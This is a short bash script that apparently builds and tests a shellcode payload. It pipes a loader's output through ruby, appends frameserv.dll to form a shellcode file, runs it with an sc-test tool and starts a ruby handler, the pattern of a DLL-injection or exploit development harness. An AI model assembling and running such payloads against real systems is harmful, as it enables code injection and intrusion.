#!/bin/bash


shellcode/loader/loader.exe | ruby >sc
cat frameserv.dll >>sc
(sleep 3; tools/sc-test/sc-test.exe sc) &
ruby handler/handler.rb
